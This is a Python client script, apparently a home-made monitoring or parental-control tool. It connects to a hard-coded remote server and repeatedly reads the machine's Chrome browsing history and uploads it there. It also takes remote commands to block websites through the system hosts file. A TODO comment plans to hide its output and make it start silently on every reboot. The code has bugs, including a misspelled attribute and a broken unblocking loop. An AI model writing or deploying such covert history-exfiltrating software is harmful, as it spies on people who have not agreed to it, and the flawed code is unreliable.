import socket,os,time
import browserhistory as bh
from datetime import datetime as dt



linux_host = '/etc/hosts'
window_host = r"C:\Windows\System32\drivers\etc\hosts"
default_folder = window_host 
redirect = "127.0.0.1"
computer_name=socket.gethostname()

class Client():#TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
    def __init__(self, port=8810, ip="192.168.1.26"):# ip wiil change
        self.s = socket.socket()
        while True:
            try:
                self.s.connect((ip,port))
            except Exception as e:
                print("waiting to server to come up")
            else:
                break    
        self.sites_to_block=[["https://www.one.co.il",0,23]]    #[[url1,start,end],[url2.start,end]]
        print("connected")         

    def run(self):
        self.first_message()
        while True:
            self.limitation()
            #self.block_websites() 
            time.sleep(1)
            self.history()
                     
    def first_message(self):
        self.s.send(f"name%{computer_name}".encode())
        
    def history(self):
        self.s.send(f"history%{computer_name}".encode())
        bh.get_browserhistory()   
        bh.write_browserhistory_csv()
        f = open("chrome_history.csv", "rb")
        print ("Sending Data ....")
        l = f.read(1024)
        while (l):
            self.s.send(l)
            l = f.read(1024)
        f.close()
        print("Sending Complete")
    
    def limitation(self):
        self.s.settimeout(0.1)
        message=""
        try:
            message=self.s.recv(1024).decode()
        except socket.timeout:
            pass
        else:
            request = message.split("%")
            if request[0]== "add url":
                self.sites_to_block.append([request[1],request[2],request[3]])           
            elif request[0]== "remove url":
                self.site_to_block.remove([request[1],request[2],request[3]]) 
            
        
    def block_websites(self):
        for websites in self.sites_to_block:
            if dt(dt.now().year, dt.now().month, dt.now().day, websites[1]) < dt.now() < dt(dt.now().year, dt.now().month, dt.now().day, websites[2]): # fuck off go to work
                print("Do the work ....")
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.read()
                    if websites[0] not in hosts:
                        hostfile.write(redirect + ' ' + websites[0] + '\n')
            else:
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.readlines()
                    hostfile.seek(0)
                    for host in hosts:
                        if not any(site in host for site in websites[0]):
                            hostfile.write(host)
                    hostfile.truncate()
                print("Good Time...")
            time.sleep(3)

def main():
    client = Client()
    client.run()
 
if __name__ == '__main__':
    main()
